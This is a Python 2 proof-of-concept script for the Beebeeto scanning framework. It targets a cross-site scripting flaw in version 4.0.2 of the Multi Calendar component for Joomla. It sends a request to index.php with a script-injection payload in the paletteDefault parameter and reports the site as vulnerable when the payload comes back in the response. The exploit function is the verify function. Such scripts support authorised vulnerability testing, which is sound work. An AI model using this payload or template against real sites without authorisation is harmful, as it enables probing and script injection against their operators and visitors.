#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0127',
            'name': 'Joomla Multi Calendar 4.0.2 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-10-29',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla',
            'vul_version': ['4.0.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Joomla漏洞', 'XSS漏洞', 'Multi Calendar', 'php'],
            'desc': '''
                    Multiple cross-site scripting (XSS) vulnerabilities in Multi
                    calendar 4.0.2 component for Joomla! allow remote attackers to inject arbitrary
                    web script or HTML code via (1) the calid parameter to index.php or (2) the paletteDefault
                    parameter to index.php.
                    ''',
            'references': ['https://www.yascanner.com/#!/x/19275',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?option=com_multicalendar&task=editevent&paletteDefault=1"/><script>alert(1)</script>'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '"/><script>alert(1)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())